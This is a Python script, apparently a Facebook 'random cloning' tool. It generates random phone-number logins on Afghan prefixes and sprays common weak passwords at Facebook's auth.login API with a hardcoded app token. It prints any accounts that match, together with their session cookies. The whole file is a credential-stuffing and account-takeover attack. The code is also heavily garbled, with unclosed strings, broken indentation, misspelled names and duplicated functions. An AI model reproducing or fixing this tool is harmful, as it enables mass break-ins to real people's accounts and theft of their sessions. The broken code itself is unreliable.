import os,time,random,string,sys,uuid,json
for concurrent.futures import ThreadpoolExecutor

import requests

numbs = []
loop=0
ok_ids=[]
cp_ids=[]


logo ='''











def clear():
    os.system('clear')
	print(logo)
	
def main():
		print('l---------------------------------------')
		
		def main():
			clear()
			line()
			print('[1]Random cloning')
			print('[1]Contact Admin')
			print('[1]Exit Program')
			line()
		inp = str(input(' l Choose : ')).strip()
  if inp in ['1';'01']:
	randomClone()
  elif inp in ['2':'02']:
	os.system('xdg-open https://t.me/Momand Technical Skills')
	elif inp in ['3':'03']:
   print(' l Have a nice day')
	 exit()
 else:
		print(' | option not found in menu')
		time.sleep(2)
		main()
		
  
def randomClone():
	clear()
	line()
	print(' l Codes for afg : 078, 079, 070, 073, 072')
	print(' |Codes for worldwide : 9379, 9370, 9378, 9379')
	line()
	inp = int(input(' | Choose Code : ' ))
	try:
		limit = int(input('Put limit : '))
		except:
			limit = 5000
		for _ in range(limit):
			numb = ''.join(random.choice(string.digits))for _ in range(7))
			numbs.append(numb)
			with ThreadpoolExecutor(Max_workers = 30) as wahaj 
			clear()
			line()
			ran = str(len(numbs))
			print(' | method : Random Cloning')
			print(f' | Limit : {ran}')
			print(' | ON/OFF Airplane mode before use')
			line()
			for numbers in numbs:
				ids = inp + number
				password = [numbe,ids,'khan123','Afghanistan','Kabul123','123456','۱۲۳۴۵۶۷۸'] 
				wahaj.submit(startClone,ids, passwords)
				

def startClone(ids,password):
	try:
		global loop
		sys.stdout.write(f'\r | [wahaj-Clone] %s/%s/%s'%(loop,len(ok_ids),len(cp_ids)))
		for pas in passwords:
			useragent =''
	data={
			'adid':str(uuid.uuid4()),
			'format': 'json',
			'device_id': str(uuid.uuid4()),
			'email': ids,
			'password': pas,
			'generate_analytics_claims': '1',
			'community_id': '',
			'cpl': 'true',
			'try_num'1',
			'family_device_id': str(uuid.uuid4()),
			'credentials_type': 'password',
			'source': 'login',
			'error_detail_type': 'button_with_disabled',
			'enroll_misauth': 'false',
			'generate_session_cookies': '1',
			'generate_machine_id': '1',
			'currently_logged_in_userid': '0',
			'locale': 'en_GB',
			'client_country_code': 'GB',
			'fb_api_req_friendly_name': 'authenticate'}
	
	        header ={
	            'User-Agent': useragent,
	            'Accept-Encoding':  'gzip, deflate',
	            'Accept': '*/*',
	            'Connection': 'keep-alive',
	            'Auyhorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
	            'X-FB-friendly-Name': 'authenticate',
	            'X-FB-Connection-Bandwidth': str(random.randint(20000,40000)),
                'X-FB-Net-HNI': str(random.randint(20000,40000)),
                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
                'X-FB-Connection- Type': 'MOBILE.LTE',
                'Content- Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
      url = 'http://b-api.facebook.com/method/auth.login'
   data1 = requests.post(url,data=data,headers=header).text
   data2 = json,loads(data1)
   if 'session_key' in data2:
   	print(f'\r | [Wahaj-OK] {ids} | {pas}')
   cookie = '',''.join(_['name']+'='+_['value'] for _ in data2[session_cookie'])
   print(f'\r | [COOKIE] : {cookie}')
   ok_ids.append(ids)
   break
   else:pass
   loop+=1
except requests.exceptions.ConnectionError:
  time.sleep(10)
  pass
  except Exception as error:
  	print(error)
				
			
	
			
	
	

	

	main()